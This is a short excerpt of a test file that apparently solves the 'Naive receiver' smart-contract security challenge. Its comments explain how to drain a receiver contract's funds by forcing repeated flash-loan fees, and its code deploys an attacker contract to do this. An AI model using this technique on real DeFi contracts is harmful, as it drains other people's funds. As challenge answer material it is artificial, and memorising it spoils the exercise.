...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Exploit", async function () {
    ...
    /**
     * It is possible to drain the funds from the users contract by paying fees
     *  flashloan(...) its called 10 times to drain all the funds
     */
    /* for (let i = 0; i < 10; i++) {
      await this.pool
        .connect(attacker)
    ...
    /**
     *  The exploit can be done by another smart contract:
     */

    const NaiveAttacker = await ethers.getContractFactory("NaiveAttacker");
    const naiveAttacker = await NaiveAttacker.deploy();
    await naiveAttacker.deployed();

    await naiveAttacker.callFlashLoan(this.pool.address, this.receiver.address);
  });
